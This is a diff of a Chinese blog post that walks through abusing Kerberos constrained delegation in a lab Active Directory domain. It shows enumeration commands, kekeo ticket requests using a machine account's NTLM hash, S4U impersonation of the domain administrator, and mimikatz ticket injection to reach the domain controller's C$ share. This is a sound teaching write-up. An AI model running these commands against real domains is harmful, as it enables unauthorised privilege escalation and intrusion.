@@ -171,7 +171,7 @@
 
     <style>
       body{
-        background-color: #c0c0c0;
+        background-color: #f5f5f5;
       }
 
       /* blog_info bottom background */
@@ -248,7 +248,7 @@
 
     
         <meta property="article:published_time" content="Sat Jan 13 2018 10:13:00 GMT-0500">
-        <meta property="article:modified_time" content="Tue Mar 27 2018 02:20:46 GMT-0400">
+        <meta property="article:modified_time" content="Tue Mar 27 2018 02:36:06 GMT-0400">
     
 
     <!-- The Twitter Card protocol -->
@@ -271,7 +271,7 @@
     "mainEntityOfPage": "http://yoursite.com/2018/01/13/利用域委派获取域某些权限/index.html",
     "headline": "利用域委派获取域某些权限",
     "datePublished": "Sat Jan 13 2018 10:13:00 GMT-0500",
-    "dateModified": "Tue Mar 27 2018 02:20:46 GMT-0400",
+    "dateModified": "Tue Mar 27 2018 02:36:06 GMT-0400",
     "author": {
         "@type": "Person",
         "name": "Sparrow",
@@ -529,23 +529,26 @@
         <a id="more"></a>
 <h2 id="0x01-域委派"><a href="#0x01-域委派" class="headerlink" title="0x01 域委派"></a>0x01 域委派</h2><p>将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。</p>
 <p>域内委派主要有3种应用方式：</p>
-<pre><code>一. 非约束性委派（Unconstrained Delegation ）
+<pre><code>一. 非约束性委派Unconstrained Delegation 
     服务账号可以获取某用户的TGT，从而服务账号可使用该TGT，模拟用户访问任意服务。
     举例说明，如果某个服务A的服务账号B被设置为非约束委派，当用户C通过Kerberos认证访问服务A时，KDC会检查服务账号B的属性，发现是非约束性委派时，KDC会将用户C的TGT放在TGS中，这样B在验证TGS的同时获取了A用户的TGT，从而可以模拟用户A访问任意服务。
     从网络攻击的角度看，如果攻击者控制了服务账号B，并诱骗管理员来访问服务A，则可以获取管理员的TGT，进而模拟管理员访问任意服务，即获得管理员权限。越是大型网络、应用越多的网络，服务账号越多，委派的应用越多，越容易获取域管理员权限。
-二. 约束性委派（Constrained Delegation）
+二. 约束性委派Constrained Delegation
     即Kerberos的扩展协议S4U2Proxy，服务账号只能获取某用户的TGS，从而只能模拟用户访问特定的服务；
 三. 协议传递
     即Kerberos的扩展协议S4U2Self，服务账号针对某一个特定服务，可查询获取任意用户的TGS，从而能模拟任意用户访问该特定服务。
-</code></pre><p>在Windows系统中，普通用户的属性中没有委派（Delegation）这个选项卡，只有服务账号、主机账号才有</p>
+</code></pre><p>在Windows系统中，普通用户的属性中没有委派Delegation这个选项卡，只有服务账号、主机账号才有</p>
 <pre><code>WIN10-NEW$ ： 192.168.19.8        加入域 DEMO.LOCAL
 owa2010dc$   ： 192.168.19.10    域服務器：DEMO.LOCAL
 testwin10 : 域用戶
 </code></pre><p>在域DEMO.LOCAL上设置WIN10-NEW$的delegation(在Service Manager -&gt; Roles -&gt; demo.local的computers里找到WIN10-NEW$右键设置)，</p>
-<blockquote>
-<p>–&gt; Trust the computer for delegation to specified service only<br>        –&gt; Use any authentication protocol<br>            –&gt; 点击add -&gt; 点击find now<br>                –&gt; owa2010dc(域机器名) -&gt;ok-&gt;ok<br>                    –&gt; 选取cifs协议(共享)<br>                    <img src="/2018/01/13/利用域委派获取域某些权限/delegation.png" alt="delegation"></p>
-</blockquote>
-<p>查询服务账户(或者机器账号)的域委派权限方法</p>
+<pre><code>--&gt; Trust the computer for delegation to specified service only
+    --&gt; Use any authentication protocol
+        --&gt; 点击add -&gt; 点击find now 
+            --&gt; owa2010dc(域机器名) -&gt;ok-&gt;ok
+                --&gt; 选取cifs协议(共享)
+![delegation](利用域委派获取域某些权限/delegation.png)
+</code></pre><p>查询服务账户(或者机器账号)的域委派权限方法</p>
 <pre><code>ldifde -f &quot;C:\windows\temp\\ld.temp&quot; -s owa2010dc -d &quot;dc=demo,dc=local&quot; -p subtree -r &quot;(&amp;(objectClass=User))&quot; -l &quot;*&quot;
 ldifde -f &quot;C:\windows\temp\\ld.temp&quot; -s owa2010dc -d &quot;dc=demo,dc=local&quot; -p subtree -r &quot;(&amp;(objectClass=User))&quot; -l &quot;cn,givenName,displayname,samAccountName,mail,department,title,description,scriptPath&quot;
 </code></pre><p>因爲ldifde導出的WIN10-NEW机器账号： </p>
@@ -554,28 +557,28 @@ WORKSTATION_TRUST_ACCOUNT : 4096
 TRUSTED_FOR_DELEGATION : 16777216
 ==&gt; 16777216 + 4096 = 16781312
 </code></pre><p>根據<a href="https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx</a>  符合規則。</p>
-<pre><code>    属性标志 十进制
-    SCRIPT                                  = 1,        // 0x1
-    ACCOUNTDISABLE                          = 2,        // 0x2
-    HOMEDIR_REQUIRED                        = 8,        // 0x8
-    LOCKOUT                                 = 16,       // 0x10
-    PASSWD_NOTREQD                          = 32,       // 0x20
-    PASSWD_CANT_CHANGE                      = 64,       // 0x40
-    ENCRYPTED_TEXT_PASSWORD_ALLOWED         = 128,      // 0x80
-    TEMP_DUPLICATE_ACCOUNT                  = 256,      // 0x100
-    NORMAL_ACCOUNT                          = 512,      // 0x200
-    INTERDOMAIN_TRUST_ACCOUNT               = 2048,     // 0x800
-    WORKSTATION_TRUST_ACCOUNT               = 4096,     // 0x1000
-    SERVER_TRUST_ACCOUNT                    = 8192,     // 0x2000
-    DONT_EXPIRE_PASSWD                      = 65536,    // 0x10000
-    MNS_LOGON_ACCOUNT                       = 131072,   // 0x20000
-    SMARTCARD_REQUIRED                      = 262144,   // 0x40000
-    TRUSTED_FOR_DELEGATION                  = 524288,   // 0x80000
-    NOT_DELEGATED                           = 1048576,  // 0x100000
-    USE_DES_KEY_ONLY                        = 2097152,  // 0x200000
-    DONT_REQUIRE_PREAUTH                    = 4194304,  // 0x400000
-    PASSWORD_EXPIRED                        = 8388608,  // 0x800000
-    TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION  = 16777216 // 0x1000000
+<pre><code>属性标志 十进制
+SCRIPT                                  = 1,        // 0x1
+ACCOUNTDISABLE                          = 2,        // 0x2
+HOMEDIR_REQUIRED                        = 8,        // 0x8
+LOCKOUT                                 = 16,       // 0x10
+PASSWD_NOTREQD                          = 32,       // 0x20
+PASSWD_CANT_CHANGE                      = 64,       // 0x40
+ENCRYPTED_TEXT_PASSWORD_ALLOWED         = 128,      // 0x80
+TEMP_DUPLICATE_ACCOUNT                  = 256,      // 0x100
+NORMAL_ACCOUNT                          = 512,      // 0x200
+INTERDOMAIN_TRUST_ACCOUNT               = 2048,     // 0x800
+WORKSTATION_TRUST_ACCOUNT               = 4096,     // 0x1000
+SERVER_TRUST_ACCOUNT                    = 8192,     // 0x2000
+DONT_EXPIRE_PASSWD                      = 65536,    // 0x10000
+MNS_LOGON_ACCOUNT                       = 131072,   // 0x20000
+SMARTCARD_REQUIRED                      = 262144,   // 0x40000
+TRUSTED_FOR_DELEGATION                  = 524288,   // 0x80000
+NOT_DELEGATED                           = 1048576,  // 0x100000
+USE_DES_KEY_ONLY                        = 2097152,  // 0x200000
+DONT_REQUIRE_PREAUTH                    = 4194304,  // 0x400000
+PASSWORD_EXPIRED                        = 8388608,  // 0x800000
+TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION  = 16777216 // 0x1000000
 </code></pre><p>或者<code>PowerView</code>的Get-DomainComputer(<a href="http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/</a>  ) ：<br>通过PowerShell脚本枚举域内所有的机器账号，查看哪些账号被设置了<code>委派</code>，以及是何种类型的委派设置(获取机器的某些信息 包括useraccountcontrol,msds-allowedtodelegatetol)：</p>
 <pre><code>PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-ComputerProperty -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl
 distinguishedname        : CN=OWA2010DC,OU=Domain Controllers,DC=demo,DC=local
@@ -633,71 +636,90 @@ distinguishedname: CN=testwin10,CN=Users,DC=demo,DC=local
 useraccountcontrol: 524800
 </code></pre><p>或者 PowerShell脚本枚举域帐户的SPN</p>
 <ol>
-<li>GetUserSPNs - kerberoast<br><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a><br><code>`</code><br>PS C:\Users\Administrator\Desktop\kerberoast&gt; . .\GetUserSPNs.ps1<br>ServicePrincipalName : kadmin/changepw<br>Name                 : krbtgt<br>SAMAccountName       : krbtgt<br>MemberOf             : CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=local<br>PasswordLastSet      : 9/13/2016 11:37:59 AM</li>
+<li><p>GetUserSPNs - kerberoast<br><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p>
+<p> PS C:\Users\Administrator\Desktop\kerberoast&gt; . .\GetUserSPNs.ps1<br> ServicePrincipalName : kadmin/changepw<br> Name                 : krbtgt<br> SAMAccountName       : krbtgt<br> MemberOf             : CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=local<br> PasswordLastSet      : 9/13/2016 11:37:59 AM</p>
+<p> ServicePrincipalName : test/test<br> Name                 : testwin10<br> SAMAccountName       : testwin10<br> MemberOf             :<br> PasswordLastSet      : 1/12/2018 3:00:22 PM</p>
+</li>
+<li><p>Get-NetUser - PowerView</p>
+<p> PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-NetUser -spn<br> objectsid              : S-1-5-21-1239069908-882060383-2558203358-502<br> iscriticalsystemobject : True<br> samaccounttype         : 805306368<br> primarygroupid         : 513<br> instancetype           : 4<br> badpasswordtime        : 1/1/1601 8:00:00 AM<br> lastlogoff             : 1/1/1601 8:00:00 AM<br> whenchanged            : 1/12/2018 6:32:42 AM<br> badpwdcount            : 0<br> useraccountcontrol     : 514<br> usncreated             : 12324<br> countrycode            : 0<br> admincount             : 1<br> objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=demo,DC=local<br> objectclass            : {top, person, organizationalPerson, user}<br> logoncount             : 0<br> lastlogon              : 1/1/1601 8:00:00 AM<br> serviceprincipalname   : kadmin/changepw<br> adspath                : LDAP://CN=krbtgt,CN=Users,DC=demo,DC=local<br> dscorepropagationdata  : {1/12/2018 6:32:42 AM, 9/13/2016 4:06:37 AM, 9/13/2016 3:53:08 AM, 1/1/1601 12:00:00 AM}<br> distinguishedname      : CN=krbtgt,CN=Users,DC=demo,DC=local<br> cn                     : krbtgt<br> pwdlastset             : 9/13/2016 11:37:59 AM<br> objectguid             : 547b1f4b-4f25-4a4f-96e9-2480d6f2e896<br> whencreated            : 9/13/2016 3:37:59 AM<br> description            : Key Distribution Center Service Account<br> samaccountname         : krbtgt<br> showinadvancedviewonly : True<br> memberof               : CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=local<br> accountexpires         : 9223372036854775807<br> usnchanged             : 28705<br> name                   : krbtgt<br> codepage               : 0<br> objectsid             : S-1-5-21-1239069908-882060383-2558203358-1126<br> samaccounttype        : 805306368<br> primarygroupid        : 513<br> instancetype          : 4<br> badpasswordtime       : 1/17/2018 8:47:37 PM<br> accountexpires        : 0<br> whenchanged           : 1/13/2018 3:43:54 AM<br> badpwdcount           : 0<br> useraccountcontrol    : 524800<br> name                  : testwin10<br> codepage              : 0<br> objectclass           : {top, person, organizationalPerson, user}<br> logoncount            : 23<br> lastlogon             : 1/18/2018 7:37:12 AM<br> serviceprincipalname  : test/test<br> usncreated            : 32796<br> dscorepropagationdata : {1/13/2018 3:43:54 AM, 1/1/1601 12:00:00 AM}<br> distinguishedname     : CN=testwin10,CN=Users,DC=demo,DC=local<br> cn                    : testwin10<br> pwdlastset            : 1/12/2018 3:00:22 PM<br> objectguid            : 2d8ce475-2bd9-4827-a3ed-6e8b4695d516<br> whencreated           : 1/12/2018 7:00:22 AM<br> samaccountname        : testwin10<br> countrycode           : 0<br> objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=demo,DC=local<br> adspath               : LDAP://CN=testwin10,CN=Users,DC=demo,DC=local<br> usnchanged            : 33123<br> lastlogoff            : 1/1/1601 8:00:00 AM<br> lastlogontimestamp    : 1/12/2018 3:00:40 PM</p>
+</li>
 </ol>
-<p>ServicePrincipalName : test/test<br>Name                 : testwin10<br>SAMAccountName       : testwin10<br>MemberOf             :<br>PasswordLastSet      : 1/12/2018 3:00:22 PM</p>
-<pre><code>2. Get-NetUser - PowerView
-</code></pre><p>PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-NetUser -spn<br>objectsid              : S-1-5-21-1239069908-882060383-2558203358-502<br>iscriticalsystemobject : True<br>samaccounttype         : 805306368<br>primarygroupid         : 513<br>instancetype           : 4<br>badpasswordtime        : 1/1/1601 8:00:00 AM<br>lastlogoff             : 1/1/1601 8:00:00 AM<br>whenchanged            : 1/12/2018 6:32:42 AM<br>badpwdcount            : 0<br>useraccountcontrol     : 514<br>usncreated             : 12324<br>countrycode            : 0<br>admincount             : 1<br>objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=demo,DC=local<br>objectclass            : {top, person, organizationalPerson, user}<br>logoncount             : 0<br>lastlogon              : 1/1/1601 8:00:00 AM<br>serviceprincipalname   : kadmin/changepw<br>adspath                : LDAP://CN=krbtgt,CN=Users,DC=demo,DC=local<br>dscorepropagationdata  : {1/12/2018 6:32:42 AM, 9/13/2016 4:06:37 AM, 9/13/2016 3:53:08 AM, 1/1/1601 12:00:00 AM}<br>distinguishedname      : CN=krbtgt,CN=Users,DC=demo,DC=local<br>cn                     : krbtgt<br>pwdlastset             : 9/13/2016 11:37:59 AM<br>objectguid             : 547b1f4b-4f25-4a4f-96e9-2480d6f2e896<br>whencreated            : 9/13/2016 3:37:59 AM<br>description            : Key Distribution Center Service Account<br>samaccountname         : krbtgt<br>showinadvancedviewonly : True<br>memberof               : CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=local<br>accountexpires         : 9223372036854775807<br>usnchanged             : 28705<br>name                   : krbtgt<br>codepage               : 0</p>
-<p>objectsid             : S-1-5-21-1239069908-882060383-2558203358-1126<br>samaccounttype        : 805306368<br>primarygroupid        : 513<br>instancetype          : 4<br>badpasswordtime       : 1/17/2018 8:47:37 PM<br>accountexpires        : 0<br>whenchanged           : 1/13/2018 3:43:54 AM<br>badpwdcount           : 0<br>useraccountcontrol    : 524800<br>name                  : testwin10<br>codepage              : 0<br>objectclass           : {top, person, organizationalPerson, user}<br>logoncount            : 23<br>lastlogon             : 1/18/2018 7:37:12 AM<br>serviceprincipalname  : test/test<br>usncreated            : 32796<br>dscorepropagationdata : {1/13/2018 3:43:54 AM, 1/1/1601 12:00:00 AM}<br>distinguishedname     : CN=testwin10,CN=Users,DC=demo,DC=local<br>cn                    : testwin10<br>pwdlastset            : 1/12/2018 3:00:22 PM<br>objectguid            : 2d8ce475-2bd9-4827-a3ed-6e8b4695d516<br>whencreated           : 1/12/2018 7:00:22 AM<br>samaccountname        : testwin10<br>countrycode           : 0<br>objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=demo,DC=local<br>adspath               : LDAP://CN=testwin10,CN=Users,DC=demo,DC=local<br>usnchanged            : 33123<br>lastlogoff            : 1/1/1601 8:00:00 AM<br>lastlogontimestamp    : 1/12/2018 3:00:40 PM</p>
-<pre><code>
-或者 (使用dsquery获取机器的某些信息 包括useraccountcontrol,msds-allowedtodelegateto)
-</code></pre><p>C:\Users\Administrator&gt;dsquery * -limit 0 -filter “(&amp;(objectCategory=computer)(objectClass=computer))” -attr cn operatingSystem distinguishedName useraccountcontrol msds-allowedtodelegateto<br>  cn           operatingSystem                      distinguishedName                                      useraccountcontrol    msds-allowedtodelegateto<br>  OWA2010DC    Windows Server 2008 R2 Datacenter    CN=OWA2010DC,OU=Domain Controllers,DC=demo,DC=local    532480<br>  OWA2010      Windows Server 2008 R2 Datacenter    CN=OWA2010,CN=Computers,DC=demo,DC=local               4096<br>  WIN10-NEW    Windows 10 Enterprise 2016 LTSB      CN=WIN10-NEW,CN=Computers,DC=demo,DC=local             16781312              cifs/OWA2010DC.demo.local/demo.local;cifs/OWA2010DC.demo.local;cifs/OWA2010DC;cifs/OWA2010DC.demo.local/DEMO;cifs/OWA2010DC/DEMO;</p>
-<pre><code>
-或者 (获取用戶某些信息 包括useraccountcontrol)
-</code></pre><p>C:\Users\Administrator&gt;dsquery * -limit 0 -filter “(&amp;(objectCategory=user)(objectClass=user))” -attr cn distinguishedName useraccountcontrol msds-allowedtodelegateto<br>  cn             distinguishedName                             useraccountcontrol        msds-allowedtodelegateto<br>  Administrator  CN=Administrator,CN=Users,DC=demo,DC=local 66048<br>  Guest          CN=Guest,CN=Users,DC=demo,DC=local         66082<br>  krbtgt         CN=krbtgt,CN=Users,DC=demo,DC=local         514<br>  testwin10      CN=testwin10,CN=Users,DC=demo,DC=local     524800</p>
-<pre><code>测试主机为域内Windows 10系统，现在以普通域用户testwin10登录系统，IPC方式连接域服务器，访问域服务器的C盘目录，显示被拒绝，权限不够。
+<p>或者 (使用dsquery获取机器的某些信息 包括useraccountcontrol,msds-allowedtodelegateto)</p>
+<pre><code>C:\Users\Administrator&gt;dsquery * -limit 0 -filter &quot;(&amp;(objectCategory=computer)(objectClass=computer))&quot; -attr cn operatingSystem distinguishedName useraccountcontrol msds-allowedtodelegateto
+  cn           operatingSystem                      distinguishedName                                      useraccountcontrol    msds-allowedtodelegateto
+  OWA2010DC    Windows Server 2008 R2 Datacenter    CN=OWA2010DC,OU=Domain Controllers,DC=demo,DC=local    532480
+  OWA2010      Windows Server 2008 R2 Datacenter    CN=OWA2010,CN=Computers,DC=demo,DC=local               4096
+  WIN10-NEW    Windows 10 Enterprise 2016 LTSB      CN=WIN10-NEW,CN=Computers,DC=demo,DC=local             16781312              cifs/OWA2010DC.demo.local/demo.local;cifs/OWA2010DC.demo.local;cifs/OWA2010DC;cifs/OWA2010DC.demo.local/DEMO;cifs/OWA2010DC/DEMO;
+</code></pre><p>或者 (获取用戶某些信息 包括useraccountcontrol)</p>
+<pre><code>C:\Users\Administrator&gt;dsquery * -limit 0 -filter &quot;(&amp;(objectCategory=user)(objectClass=user))&quot; -attr cn distinguishedName useraccountcontrol msds-allowedtodelegateto
+  cn             distinguishedName                             useraccountcontrol        msds-allowedtodelegateto
+  Administrator  CN=Administrator,CN=Users,DC=demo,DC=local 66048
+  Guest          CN=Guest,CN=Users,DC=demo,DC=local         66082
+  krbtgt         CN=krbtgt,CN=Users,DC=demo,DC=local         514
+  testwin10      CN=testwin10,CN=Users,DC=demo,DC=local     524800
+</code></pre><p>测试主机为域内Windows 10系统，现在以普通域用户testwin10登录系统，IPC方式连接域服务器，访问域服务器的C盘目录，显示被拒绝，权限不够。</p>
+<p>C:\Users\testwin10&gt;whoami</p>
+<pre><code>demo\testwin10
+</code></pre><p>C:\Users\testwin10&gt;dir \owa2010dc.demo.local\c$</p>
+<pre><code>Access is denied.
+</code></pre><p><img src="/2018/01/13/利用域委派获取域某些权限/testwin10.png" alt="testwin10"></p>
+<p>现在已知域内机器账号的口令(计算机的机器账号密码默认是随机的，每30天轮换一次)，则可使用kekeo工具构造WIN10-NEW机器账号的票据。命令和执行结果如下</p>
+<pre><code>tgt::ask /user:WIN10-NEW$ /domain:demo.local /NTLM:5b8303606d3478a49e47650272fea13b
+</code></pre><p>已知域内主机账号(机器账号WIN10-NEW$)，使用kekeo工具构造该主机账号的TGT票据 ： </p>
+<pre><code>(如果是服务账号的话命令就是：tgt::ask /user:sqlsrv /domain:demo.local /password:xxx /ticket:sqlsrv.kirbi)
+kekeo # tgt::ask /user:WIN10-NEW$ /domain:demo.local /NTLM:5b8303606d3478a49e47650272fea13b
+Realm        : demo.local (demo)
+User         : WIN10-NEW$ (WIN10-NEW$)
+CName        : WIN10-NEW$       [KRB_NT_PRINCIPAL (1)]
+SName        : krbtgt/demo.local        [KRB_NT_SRV_INST (2)]
+Need PAC     : Yes
+Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 5b8303606d3478a49e47650272fea13b
+[kdc] name: OWA2010DC.demo.local (auto)
+[kdc] addr: 192.168.18.10 (auto)
+  Ticket in file &#39;TGT_WIN10-NEW$@DEMO.LOCAL_krbtgt~demo.local@DEMO.LOCAL.kirbi&#39;
 
-C:\Users\testwin10&gt;whoami
-
-    demo\testwin10
-
-C:\Users\testwin10&gt;dir \\owa2010dc.demo.local\c$
-
-    Access is denied.
-![testwin10](利用域委派获取域某些权限/testwin10.png)
-
-现在已知域内机器账号的口令(计算机的机器账号密码默认是随机的，每30天轮换一次)，则可使用kekeo工具构造WIN10-NEW机器账号的票据。命令和执行结果如下
-
-    tgt::ask /user:WIN10-NEW$ /domain:demo.local /NTLM:5b8303606d3478a49e47650272fea13b
-
-已知域内主机账号(机器账号WIN10-NEW$)，使用kekeo工具构造该主机账号的TGT票据 ： 
-</code></pre><p>(如果是服务账号的话命令就是：tgt::ask /user:sqlsrv /domain:demo.local /password:xxx /ticket:sqlsrv.kirbi)<br>kekeo # tgt::ask /user:WIN10-NEW$ /domain:demo.local /NTLM:5b8303606d3478a49e47650272fea13b<br>Realm        : demo.local (demo)<br>User         : WIN10-NEW$ (WIN10-NEW$)<br>CName        : WIN10-NEW$       [KRB_NT_PRINCIPAL (1)]<br>SName        : krbtgt/demo.local        [KRB_NT_SRV_INST (2)]<br>Need PAC     : Yes<br>Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 5b8303606d3478a49e47650272fea13b<br>[kdc] name: OWA2010DC.demo.local (auto)<br>[kdc] addr: 192.168.18.10 (auto)<br>  Ticket in file <a href="mailto:&#39;TGT_WIN10-NEW$@DEMO.LOCA" target="_blank" rel="noopener">&#39;TGT_WIN10-NEW$@DEMO.LOCA</a><a href="mailto:L_krbtgt~demo.local@DEMO.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~demo.local@DEMO.LOCAL.kirbi</a>‘</p>
-<p>使用kekeo工具构造该主机账号的TGT票据<br><img src="/2018/01/13/利用域委派获取域某些权限/kekeo.png" alt="kekeo"></p>
-<pre><code>
-由于设置了约束性委派所以利用刚才的WIN10-NEW$的TGT票据，像域服务器发起申请访问域服务器相应服务(CIFS共享服务)管理权限的TGS票据 ： 
-
-    Tgs::s4u /tgt:service_account_tgt_file /user:administrator@testlab.com /service:service_to_access
-即：
-</code></pre><p>kekeo # tgs::s4u /tgt:<a href="mailto:TGT_WIN10-NEW$@DEMO.LOCA" target="_blank" rel="noopener">TGT_WIN10-NEW$@DEMO.LOCA</a><a href="mailto:L_krbtgt~demo.local@DEMO.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~demo.local@DEMO.LOCAL.kirbi</a> /user:<a href="mailto:administrator@demo.local" target="_blank" rel="noopener">administrator@demo.local</a> /service:cifs/OWA2010DC.demo.local<br>Ticket  : <a href="mailto:TGT_WIN10-NEW$@DEMO.LOCA" target="_blank" rel="noopener">TGT_WIN10-NEW$@DEMO.LOCA</a><a href="mailto:L_krbtgt~demo.local@DEMO.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~demo.local@DEMO.LOCAL.kirbi</a><br>  [krb-cred]     S: krbtgt/demo.local @ DEMO.LOCAL<br>  [krb-cred]     E: [00000012] aes256_hmac<br>  [enc-krb-cred] P: WIN10-NEW$ @ DEMO.LOCAL<br>  [enc-krb-cred] S: krbtgt/demo.local @ DEMO.LOCAL<br>  [enc-krb-cred] T: [1/12/2018 2:17:58 AM ; 1/12/2018 12:17:58 PM] {R:1/19/2018 2:17:58 AM}<br>  [enc-krb-cred] F: [40e00000] pre_authent ; initial ; renewable ; forwardable ;<br>  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): a9e1f34bc1c62de37793943742e0f235a4ba0a0ec01a9899f52b1e9e7798970c<br>  [s4u2self]  <a href="mailto:administrator@demo.local" target="_blank" rel="noopener">administrator@demo.local</a><br>[kdc] name: OWA2010DC.demo.local (auto)<br>[kdc] addr: 192.168.18.10 (auto)<br>  Ticket in file <a href="mailto:&#39;TGS_administrator@demo.local" target="_blank" rel="noopener">&#39;TGS_administrator@demo.local</a>@<a href="mailto:DEMO.LOCAL_WIN10-NEW$@DEMO.LOCAL.kirbi" target="_blank" rel="noopener">DEMO.LOCAL_WIN10-NEW$@DEMO.LOCAL.kirbi</a>‘<br>Service(s):<br>  [s4u2proxy] cifs/OWA2010DC.demo.local<br>  Ticket in file <a href="mailto:&#39;TGS_administrator@demo.local" target="_blank" rel="noopener">&#39;TGS_administrator@demo.local</a>@<a href="mailto:DEMO.LOCAL_cifs~OWA2010DC.demo.local@DEMO.LOCAL.kirbi" target="_blank" rel="noopener">DEMO.LOCAL_cifs~OWA2010DC.demo.local@DEMO.LOCAL.kirbi</a>‘</p>
-<pre><code>向域服务器发起申请访问域服务器相应服务(CIFS服务)管理权限的TGS票据
-![cfis1](利用域委派获取域某些权限/cfis1.png)
-
-ok
-
-此时内存中已经有了访问域服务器CIFS服务的域管理员的TGS票据，需要将该票据(administrator的TGS票据)注入当前的会话中，使用mimikatz的kerberos::ptt命令可完成票据的注入。
-注入票据后，当前的会话具备了访问域服务器C盘目录的权限 （kekeo ticket 注入） 
-
-    kerberos::ptt TGS_administrator@demo.local@DEMO.LOCAL_cifs~OWA2010DC.demo.local@DEMO.LOCAL.kirbi
-
-注入票据后，访问域服务器C盘目录的权限
-![cfis2](利用域委派获取域某些权限/cfis2.png)
-
-    dir \\owa2010dc.demo.local\c$ ==&gt; ok
-(4个小时后TGT失效，需要重新认证。)
-
-https://www.anquanke.com/post/id/92484 示例有四個，他演示的是示例1，這裏演示的是示例4
-
-    样例1：已知被设置约束性委派属性的服务账号的口令明文，则可以获取域管理权限
-    样例2：已控制约束性委派服务账号所在的服务器
-        攻击者控制了服务器，与样例1类似。由于攻击者控制了服务器，可直接利用mimikatz从内存获取服务账号的TGT，所以可以省去tgt::ask步骤，直接从tgs:s4u步骤开始，后续和样例1相同。
-    样例3：已获取配置了约束性委派的服务账号的口令NTLM
-        和样例1相同，样例1用明文口令生成NTLM，然后向域服务器申请获取服务账号的TGT。Kekeo提供了该功能，可直接从NTLM开始，向域服务器申请TGT。
-    样例4：一个主机账号被设置了约束性委派，已获取该主机账号的口令NTLM
-        方法和样例1也是类似，只不过样例1中是服务账号，而本样例中是主机账号。测试结果截图分别如下，不再过多解释。测试可在任何域内主机中进行，不需要在主机账号所在的主机。
-
-參考：
-</code></pre><p><a href="https://www.anquanke.com/post/id/92484" target="_blank" rel="noopener">https://www.anquanke.com/post/id/92484</a>  (作者筆誤： “由于sqlsvc被设置为非约束性委派” 改成 “由于sqlsvc被设置为约束性委派” 已證明 )<br><a href="http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/</a><br><a href="http://powersploit.readthedocs.io/en/latest/" target="_blank" rel="noopener">http://powersploit.readthedocs.io/en/latest/</a><br><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a><br><code>`</code></p>
-
+使用kekeo工具构造该主机账号的TGT票据
+![kekeo](利用域委派获取域某些权限/kekeo.png)
+</code></pre><p>由于设置了约束性委派所以利用刚才的WIN10-NEW$的TGT票据，像域服务器发起申请访问域服务器相应服务(CIFS共享服务)管理权限的TGS票据 ： </p>
+<pre><code>Tgs::s4u /tgt:service_account_tgt_file /user:administrator@testlab.com /service:service_to_access
+</code></pre><p>即：</p>
+<pre><code>kekeo # tgs::s4u /tgt:TGT_WIN10-NEW$@DEMO.LOCAL_krbtgt~demo.local@DEMO.LOCAL.kirbi /user:administrator@demo.local /service:cifs/OWA2010DC.demo.local
+Ticket  : TGT_WIN10-NEW$@DEMO.LOCAL_krbtgt~demo.local@DEMO.LOCAL.kirbi
+  [krb-cred]     S: krbtgt/demo.local @ DEMO.LOCAL
+  [krb-cred]     E: [00000012] aes256_hmac
+  [enc-krb-cred] P: WIN10-NEW$ @ DEMO.LOCAL
+  [enc-krb-cred] S: krbtgt/demo.local @ DEMO.LOCAL
+  [enc-krb-cred] T: [1/12/2018 2:17:58 AM ; 1/12/2018 12:17:58 PM] {R:1/19/2018 2:17:58 AM}
+  [enc-krb-cred] F: [40e00000] pre_authent ; initial ; renewable ; forwardable ;
+  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): a9e1f34bc1c62de37793943742e0f235a4ba0a0ec01a9899f52b1e9e7798970c
+  [s4u2self]  administrator@demo.local
+[kdc] name: OWA2010DC.demo.local (auto)
+[kdc] addr: 192.168.18.10 (auto)
+  Ticket in file &#39;TGS_administrator@demo.local@DEMO.LOCAL_WIN10-NEW$@DEMO.LOCAL.kirbi&#39;
+Service(s):
+  [s4u2proxy] cifs/OWA2010DC.demo.local
+  Ticket in file &#39;TGS_administrator@demo.local@DEMO.LOCAL_cifs~OWA2010DC.demo.local@DEMO.LOCAL.kirbi&#39;
+</code></pre><p>向域服务器发起申请访问域服务器相应服务(CIFS服务)管理权限的TGS票据<br><img src="/2018/01/13/利用域委派获取域某些权限/cfis1.png" alt="cfis1"></p>
+<p>ok</p>
+<p>此时内存中已经有了访问域服务器CIFS服务的域管理员的TGS票据，需要将该票据(administrator的TGS票据)注入当前的会话中，使用mimikatz的kerberos::ptt命令可完成票据的注入。<br>注入票据后，当前的会话具备了访问域服务器C盘目录的权限 kekeo ticket 注入 </p>
